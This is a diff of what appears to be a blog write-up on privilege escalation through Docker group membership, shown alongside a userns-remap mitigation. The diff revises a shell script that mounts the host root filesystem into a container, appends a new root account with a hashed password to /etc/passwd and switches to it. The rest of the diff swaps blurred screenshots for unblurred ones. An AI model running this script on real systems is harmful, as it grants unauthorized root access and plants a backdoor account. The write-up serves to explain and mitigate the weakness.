@@ -183,19 +183,17 @@ elif [ "$docker_test" == "CONTAINER ID" ]; then
     echo 'Please write down your new root credentials.'
     read -p 'Choose a root user name: ' rootname
     read -s -p 'Choose a root password: ' passw
-    echo ""
-    read -p 'Choose the the salt to hash your password: ' salt
-    hpass=$(openssl passwd -1 -salt $salt $passw)
+    hpass=$(openssl passwd -1 -salt mysalt $passw)
 
     echo -e "$rootname:$hpass:0:0:root:/root:/bin/bash" > new_account
     mv new_account /tmp/new_account
     docker run -tid -v /:/mnt/ --name flast101.github.io alpine # CHANGE THIS IF NEEDED
-    sleep 1; echo 'Please wait...'; sleep 1; echo 'Running container...'; sleep 1; echo 'Creating root user...';
     docker exec -ti flast101.github.io sh -c "cat /mnt/tmp/new_account >> /mnt/etc/passwd"
     sleep 1; echo '...'
     
     echo 'Success! Root user ready. Enter your password to login as root:'
     docker rm -f flast101.github.io
+    docker image rm alpine
     rm /tmp/new_account
     su $rootname
 
@@ -208,7 +206,7 @@ Example:
 
 
 
-![privesc-blur.png](privesc-blur.png "privesc-blur.png")
+![privesc.png](privesc.png "privesc.png")
 
 
 
@@ -243,12 +241,12 @@ systemctl daemon-reload && systemctl restart docker
 
 By default, the process is run as root in the container:
 
-![nomitig-blur.png](nomitig-blur.png "nomitig-blur.png")
+![nomitig.png](nomitig.png "nomitig.png")
 
 Applying the mitigation, we can get rid of this problem. The user "dockremap" is now running the process:
 
 
-![mitig-blur.png](mitig-blur.png "mitig-blur.png")
+![mitig.png](mitig-blur.png "mitig.png")
 
 
 
